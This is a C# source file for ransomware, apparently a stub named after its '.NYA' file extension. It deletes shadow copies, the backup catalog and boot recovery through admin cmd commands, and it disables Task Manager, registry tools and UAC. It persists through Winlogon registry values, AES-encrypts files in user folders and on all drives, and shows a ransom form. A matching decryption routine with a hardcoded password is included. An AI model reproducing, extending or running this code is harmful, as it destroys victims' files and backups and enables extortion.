using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub
{
    class Encryption
    {
        public static void OFF_Encrypt() //time to descrypt
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c bootrec /rebuildbcd";
            psi.Verb = "runas";
            Process.Start(psi);

            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
           @"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                objRegistryKey.DeleteValue("DisableTaskMgr");

            objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
            RegistryKey regedit = Registry.CurrentUser.CreateSubKey(
          @"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            if (regedit.GetValue("DisableRegistryTools") == null)
                regedit.DeleteValue("DisableRegistryTools");

            regedit.DeleteValue("DisableRegistryTools");
            regedit.Close();

            


            string path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadsFolder = Path.Combine(userRoot, "Downloads");
            string Videos = Path.Combine(userRoot, "Videos");
            string Music = Path.Combine(userRoot, "Music");
            string Pictures = Path.Combine(userRoot, "Pictures");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadsFolder + @"\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(Videos + @"\", "*", SearchOption.AllDirectories);
            string[] files4 = Directory.GetFiles(Music + @"\", "*", SearchOption.AllDirectories);
            string[] files5 = Directory.GetFiles(Pictures + @"\", "*", SearchOption.AllDirectories);

            DecryptionFile dec = new DecryptionFile();

            string password = "5476zdurgderghdjkth54u6irfutzhiuobr5g6hjitzfuhbklujftzhobr7KURTBARZGtlkiuzdrtoliuhbdzbthutzhjrbdu@rgfdgzuirdbdnh43583475§/&%/(§&%78397653";

            Thread thread = new Thread(() =>
            {
                try
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        try
                        {
                            dec.DecryptFile(files[i], password);
                            File.Move(files[i], files[i].Replace(".NYA", ""));
                        }
                        catch (Exception ex) { }
                    }

                    for (int i = 0; i < files2.Length; i++)
                    {
                        try
                        {
                            dec.DecryptFile(files2[i], password);
                            File.Move(files2[i], files2[i].Replace(".NYA", ""));
                        }
                        catch (Exception ex) { }

                    }

                    for (int i = 0; i < files3.Length; i++)
                    {
                        try
                        {
                            dec.DecryptFile(files3[i], password);
                            File.Move(files3[i], files3[i].Replace(".NYA", ""));
                        }
                        catch (Exception ex) { }

                    }

                    for (int i = 0; i < files4.Length; i++)
                    {
                        try
                        {
                            dec.DecryptFile(files4[i], password);
                            File.Move(files4[i], files4[i].Replace(".NYA", ""));
                        }
                        catch (Exception ex) { }

                    }

                    for (int i = 0; i < files5.Length; i++)
                    {
                        try
                        {
                            dec.DecryptFile(files5[i], password);
                            File.Move(files5[i], files5[i].Replace(".NYA", ""));
                        }
                        catch (Exception ex) { }

                    }

                    foreach (DriveInfo usb in DriveInfo.GetDrives())
                    {
                        string[] usbfiles = Directory.GetFiles(usb.Name, "*", SearchOption.AllDirectories);

                        for (int i = 0; i < usbfiles.Length; i++)
                        {
                            try
                            {
                                dec.DecryptFile(usbfiles[i], password);
                                File.Move(usbfiles[i], usbfiles[i].Replace(".NYA", ""));
                            }
                            catch (Exception ex) { }
                        }
                    }
                }
                catch (Exception e)
                {

                }

                RegistryKey localMachine = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);

                RegistryKey key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("EnableLUA", 0x0000001, RegistryValueKind.DWord);
                key.Close();

                RegistryKey key2 = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                key2.SetValue("Userinit", @"C:\windows\system32\userinit.exe,");
                key2.Close();

                Process.GetCurrentProcess().Kill();
            });

            thread.Start();
        }

        public static void Start()
        {

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
            psi.Verb = "runas";
            Process.Start(psi);
            RegistryKey regedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            regedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            regedit.Close();
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey localMachine = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey timerset = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            timerset.SetValue("ShellExperience", "\"" + "ShellExperience.exe" + "\"", RegistryValueKind.String);
            timerset.Close();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadsFolder = Path.Combine(userRoot, "Downloads");
            string Videos = Path.Combine(userRoot, "Videos");
            string Music = Path.Combine(userRoot, "Music");
            string Pictures = Path.Combine(userRoot, "Pictures");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadsFolder + @"\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(Videos + @"\", "*", SearchOption.AllDirectories);
            string[] files4 = Directory.GetFiles(Music + @"\", "*", SearchOption.AllDirectories);
            string[] files5 = Directory.GetFiles(Pictures + @"\", "*", SearchOption.AllDirectories);

            EncryptionFile enc = new EncryptionFile();

            string password = "5476zdurgderghdjkth54u6irfutzhiuobr5g6hjitzfuhbklujftzhobr7KURTBARZGtlkiuzdrtoliuhbdzbthutzhjrbdu@rgfdgzuirdbdnh43583475§/&%/(§&%78397653";
            try
            {
                List<string> lines = new List<string>();

                for (int i = 0; i < files.Length; i++)
                {
                    try
                    {
                        if (!files[i].EndsWith(".NYA"))
                        {
                            lines.Add("Encrypted: " + files[i]);

                            enc.EncryptFile(files[i], password);
                            File.Move(files[i], files[i] + ".NYA");
                        }

                    }
                    catch (Exception ex) { }
                }

                for (int i = 0; i < files2.Length; i++)
                {
                    if (!files2[i].EndsWith(".NYA"))
                    {


                        try
                        {
                            lines.Add("Encrypted: " + files2[i]);
                            enc.EncryptFile(files2[i], password);
                            File.Move(files2[i], files2[i] + ".NYA");
                        }
                        catch (Exception ex)
                        {

                        }
                    }

                }

                for (int i = 0; i < files3.Length; i++)
                {
                    if (!files3[i].EndsWith(".NYA"))
                    {
                        try
                        {
                            lines.Add("Encrypted: " + files3[i]);
                            enc.EncryptFile(files3[i], password);
                            File.Move(files3[i], files3[i] + ".NYA");
                        }
                        catch (Exception ex) { }
                    }

                }

                for (int i = 0; i < files4.Length; i++)
                {
                    if (!files4[i].EndsWith(".NYA"))
                    {
                        try
                        {
                            lines.Add("Encrypted: " + files4[i]);
                            enc.EncryptFile(files4[i], password);
                            File.Move(files4[i], files4[i] + ".NYA");
                        }
                        catch (Exception ex) { }
                    }

                }

                for (int i = 0; i < files5.Length; i++)
                {
                    if (!files5[i].EndsWith(".NYA"))
                    {
                        try
                        {
                            lines.Add("Encrypted: " + files5[i]);
                            enc.EncryptFile(files5[i], password);
                            File.Move(files5[i], files5[i] + ".NYA");
                        }
                        catch (Exception ex) { }
                    }

                }

                foreach (DriveInfo usb in DriveInfo.GetDrives())
                {
                    string[] usbfiles = Directory.GetFiles(usb.Name, "*", SearchOption.AllDirectories);

                    for (int i = 0; i < usbfiles.Length; i++)
                    {
                        if (!usbfiles[i].EndsWith(".NYA"))
                        {
                            try
                            {
                                lines.Add("Encrypted: " + usbfiles[i]);
                                enc.EncryptFile(usbfiles[i], password);
                                File.Move(usbfiles[i], usbfiles[i] + ".NYA");
                            }
                            catch (Exception ex) { }
                        }
                    }
                }

                File.WriteAllLines("Winrar.dat", lines);
            }
            catch (Exception e)
            {

            }



            RegistryKey key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
            key.SetValue("EnableLUA", 0x0000000, RegistryValueKind.DWord);
            key.Close();

            RegistryKey key2 = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            key2.SetValue("Userinit", @"C:\windows\system32\userinit.exe," + Process.GetCurrentProcess().MainModule.FileName + ",");
            key2.Close();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new NYA());
        }

        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class CoreDecryption
        {
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] decryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }

                return decryptedBytes;
            }
        }



        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {
                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                string file = fileEncrypted;
                File.WriteAllBytes(file, bytesDecrypted);

            }
        }
    }
}
